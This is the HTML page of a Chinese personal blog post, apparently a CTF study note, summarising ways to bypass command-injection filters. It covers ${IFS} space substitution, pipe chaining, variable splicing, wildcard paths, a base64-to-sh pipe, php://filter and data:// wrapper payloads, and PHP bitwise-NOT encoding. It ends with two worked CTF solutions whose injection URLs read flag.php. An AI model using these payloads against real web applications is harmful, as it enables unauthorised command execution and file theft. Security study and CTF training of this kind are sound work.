@@ -1,0 +1,328 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>关于命令执行绕过的一些总结 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="空格过滤${IFS}形式：
+1$&amp;#123;IFS&amp;#125;、$&amp;#123;IFS&amp;#125;$、$IFS$加数字（$IFS$1）、$&amp;#123;IFS
+
+
+
+重定向符（&amp;lt;&amp;gt;）形式：
+,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">关于命令执行绕过的一些总结</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">关于命令执行绕过的一些总结</h1>
+        <div class="stuff">
+            <span>八月 22, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><h4 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h4><p>形式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;、$&#123;IFS&#125;$、$IFS$加数字（$IFS$<span class="number">1</span>）、$&#123;IFS</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="重定向符（-lt-gt-）"><a href="#重定向符（-lt-gt-）" class="headerlink" title="重定向符（&lt;&gt;）"></a>重定向符（&lt;&gt;）</h4><p>形式：</p>
+<p><strong>&lt;&gt;、&lt;</strong></p>
+<p><img src="1.png"></p>
+<h4 id="09-需要php环境-tab键"><a href="#09-需要php环境-tab键" class="headerlink" title="%09(需要php环境)(tab键)"></a>%09(需要php环境)(tab键)</h4><h3 id="管道符绕过"><a href="#管道符绕过" class="headerlink" title="管道符绕过"></a>管道符绕过</h3><ul>
+<li><p>|直接执行后面的语句</p>
+</li>
+<li><p>||：具有短路效果，左边是true，右边不执行。</p>
+</li>
+<li><p>&amp;：无论左边是false还是true，&amp;前面和后面命令都要执行</p>
+</li>
+<li><p>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</li>
+<li><p>Linux下多了一个;管道符，作用和&amp;一样.</p>
+</li>
+</ul>
+<h3 id="命令执行变量拼接"><a href="#命令执行变量拼接" class="headerlink" title="命令执行变量拼接"></a><strong>命令执行变量拼接</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># a=c;b=at;c=fl;d=ag;$a$b $c$d</span></span><br><span class="line">/?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=g;cat$IFS$<span class="number">1</span>fla<span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="2.png"></p>
+<h3 id="base64编码（无字母rce）"><a href="#base64编码（无字母rce）" class="headerlink" title="base64编码（无字母rce）"></a>base64编码（无字母rce）</h3><p>我们就可以通过通配符进行匹配命令执行查看flag.php</p>
+<p><strong>payload：?c=/???/????64 ????.???</strong></p>
+<p>意思是 /bin/base64 flag.php</p>
+<h3 id="bzip2的使用"><a href="#bzip2的使用" class="headerlink" title="bzip2的使用"></a><strong>bzip2的使用</strong></h3><p>bzip2是linux下面的压缩文件的命令</p>
+<p>我们可以通过该命令压缩flag.php 然后进行下载</p>
+<p><strong>payload：?c=/???/???/????2 ????.???</strong></p>
+<p>也就是/usr/bin/bzip2 flag.php</p>
+<h3 id="单引号、双引号绕过"><a href="#单引号、双引号绕过" class="headerlink" title="单引号、双引号绕过"></a>单引号、双引号绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># c&quot;&quot;at fl&#x27;&#x27;ag</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="3.png"></p>
+<p><img src="4.png"></p>
+<h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># c\at fl\ag</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="5.png"></p>
+<h3 id="cat绕过"><a href="#cat绕过" class="headerlink" title="cat绕过"></a>cat绕过</h3><p>当cat 被过滤时，可以使用如下命令代替：</p>
+<p><img src="6.png"></p>
+<h3 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h3><p>反引号 和 $(命令)都是执行命令的方式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;cat$IFS$<span class="number">9</span>`ls`</span><br><span class="line">?c=<span class="keyword">echo</span> `cat f*`;</span><br></pre></td></tr></table></figure>
+
+<p><img src="7.png"></p>
+<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>？字符代表单个字符；</p>
+<p>如果要匹配多个字符，就需要多个？连用。</p>
+<p>?不能匹配空字符，也就是说它占据的位置必须要有字符存在。</p>
+<p>  <em><em>?c=system(‘cat f</em>‘);</em>*</p>
+<p><img src="8.png"></p>
+<p>/bin/cat  /bin/是一个目录</p>
+<p>*代表任意数量的字符，可以匹配空字符。</p>
+<p><strong>?</strong> 通配符匹配文件名中的 0 个或 1 个字符，而 ***** 通配符匹配零个或多个字符。</p>
+<h3 id="过滤bash用sh执行"><a href="#过滤bash用sh执行" class="headerlink" title="过滤bash用sh执行"></a><strong>过滤bash用sh执行</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh    //1Y2F0IGZsYWcucGhw-&gt;cat flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="利用文件包含绕过（无法使用反引号时可以考虑）"><a href="#利用文件包含绕过（无法使用反引号时可以考虑）" class="headerlink" title="利用文件包含绕过（无法使用反引号时可以考虑）"></a>利用文件包含绕过（无法使用反引号时可以考虑）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get:</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="伪协议绕过"><a href="#伪协议绕过" class="headerlink" title="伪协议绕过"></a>伪协议绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat f*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="异或-取反"><a href="#异或-取反" class="headerlink" title="异或 取反"></a>异或 取反</h3><p><a target="_blank" rel="noopener" href="https://xiaofeiji-77.github.io/2021/08/22/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">https://xiaofeiji-77.github.io/2021/08/22/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="代码执行-ctfhub-hate-php（取反）"><a href="#代码执行-ctfhub-hate-php（取反）" class="headerlink" title="代码执行  ctfhub hate-php（取反）"></a>代码执行  ctfhub hate-php（取反）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#x27;|\`|\||\[|\]|\_|=)/i&#x27;</span>,<span class="variable">$code</span>)) &#123; </span><br><span class="line"></span><br><span class="line">​    <span class="keyword">die</span>(<span class="string">&#x27;You are too good for me&#x27;</span>); </span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$blacklist</span> = get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123; </span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$code</span>)) &#123; </span><br><span class="line"></span><br><span class="line">​      <span class="keyword">die</span>(<span class="string">&#x27;You deserve better&#x27;</span>); </span><br><span class="line"></span><br><span class="line">​    &#125; </span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  assert(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>代码分析：preg_match过滤了flag ph等关键字包括一些符号，get_defined_functions()函数的意思就是将里面的函数都过滤掉了，assert()将字符串当做PHP代码执行。</p>
+<p><img src="9.png"></p>
+<ul>
+<li>因此题目的关键在于：过滤了关键字和符号，并且过滤了函数，可以利用的点就是通过assert函数读取命令。采用取反绕过。</li>
+</ul>
+<p>取反：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/v01cano/p/11736722.html">https://www.cnblogs.com/v01cano/p/11736722.html</a></p>
+<p>尝试使用**print_r(scandir(‘.’))**命令读取当前目录的文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">&#x27;print_r&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">&#x27;scandir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="10.png"></p>
+<p>要在该加括号的地方对应加上括号：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=(~%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D)((~%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D)((~%D1)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="11.png"></p>
+<p>再使用同样的方法编码获取flag，因为highlight_file()函数也被过滤掉了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">&#x27;highlight_file&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//payload=</span></span><br><span class="line">  /?code=(~%<span class="number">97</span>%<span class="number">96</span>%<span class="number">98</span>%<span class="number">97</span>%<span class="number">93</span>%<span class="number">96</span>%<span class="number">98</span>%<span class="number">97</span>%<span class="number">8</span>B%A0%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">9</span>A)((~%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F))</span><br></pre></td></tr></table></figure>
+
+<p>提交得到flag。</p>
+<h4 id="命令执行：buuctf-ping-ping-ping（空格过滤，变量拼接）"><a href="#命令执行：buuctf-ping-ping-ping（空格过滤，变量拼接）" class="headerlink" title="命令执行：buuctf- ping ping ping（空格过滤，变量拼接）"></a>命令执行：buuctf- ping ping ping（空格过滤，变量拼接）</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12246386.html">https://www.cnblogs.com/wangtanzhi/p/12246386.html</a></p>
+<ul>
+<li>打开页面只有一个?ip=的提示，看到ip想到命令执行，尝试传递参数：?ip=127.0.0.1</li>
+</ul>
+<p>发现有返回结果：</p>
+<p><img src="12.png"></p>
+<p>修改大小写发现操作系统为Linux，</p>
+<ul>
+<li>直接使用管道符进行目录查询：</li>
+</ul>
+<p><strong>?ip=127.0.0.1| ls</strong></p>
+<ul>
+<li>发现提示过滤了空格，</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">空格过滤的绕过方式：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>$&#123;IFS&#125;</span><br><span class="line">$IFS$数字</span><br><span class="line">$&#123;IFS</span><br><span class="line">%<span class="number">20</span></span><br><span class="line">&lt;和&lt;&gt;</span><br><span class="line"> %<span class="number">09</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>逐个进行尝试:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现第二个$IFS$加数字可以绕过：</span><br><span class="line"></span><br><span class="line">/?ip=<span class="number">127.0</span>.<span class="number">0.1</span>|$IFS$<span class="number">1</span>ls</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="13.png"></p>
+<ul>
+<li>读取flag.php，发现flag被过滤了，尝试使用<strong>变量拼接</strong>：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>|a=g;cat$IFS$<span class="number">1</span>fla<span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>发现没有返回，换一个管道符就可以了：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=g;cat$IFS$<span class="number">1</span>fla<span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="14.png"></p>
+<h3 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iloveacm/p/13687654.html">https://www.cnblogs.com/iloveacm/p/13687654.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Jim2g/articles/13641685.html">CTF 命令执行 - Jim_2g - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12246386.html">https://www.cnblogs.com/wangtanzhi/p/12246386.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45836474/article/details/107248010">命令执行漏洞各种绕过方式_m0re’s blog-CSDN博客_命令执行漏洞绕过</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">空格过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IFS"><span class="toc-number">1.1.</span> <span class="toc-text">${IFS}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6%EF%BC%88-lt-gt-%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">重定向符（&lt;&gt;）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#09-%E9%9C%80%E8%A6%81php%E7%8E%AF%E5%A2%83-tab%E9%94%AE"><span class="toc-number">1.3.</span> <span class="toc-text">%09(需要php环境)(tab键)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">管道符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">命令执行变量拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8Drce%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">base64编码（无字母rce）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bzip2%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">bzip2的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">单引号、双引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E7%BA%BF"><span class="toc-number">7.</span> <span class="toc-text">反斜线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">cat绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%95%9B%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">内敛执行绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">10.</span> <span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4bash%E7%94%A8sh%E6%89%A7%E8%A1%8C"><span class="toc-number">11.</span> <span class="toc-text">过滤bash用sh执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87%EF%BC%88%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%BC%95%E5%8F%B7%E6%97%B6%E5%8F%AF%E4%BB%A5%E8%80%83%E8%99%91%EF%BC%89"><span class="toc-number">12.</span> <span class="toc-text">利用文件包含绕过（无法使用反引号时可以考虑）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">伪协议绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96-%E5%8F%96%E5%8F%8D"><span class="toc-number">14.</span> <span class="toc-text">异或 取反</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">15.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-ctfhub-hate-php%EF%BC%88%E5%8F%96%E5%8F%8D%EF%BC%89"><span class="toc-number">15.1.</span> <span class="toc-text">代码执行  ctfhub hate-php（取反）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%9Abuuctf-ping-ping-ping%EF%BC%88%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%EF%BC%89"><span class="toc-number">15.2.</span> <span class="toc-text">命令执行：buuctf- ping ping ping（空格过滤，变量拼接）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E7%AB%A0%E5%8F%82%E8%80%83"><span class="toc-number">16.</span> <span class="toc-text">文章参考</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
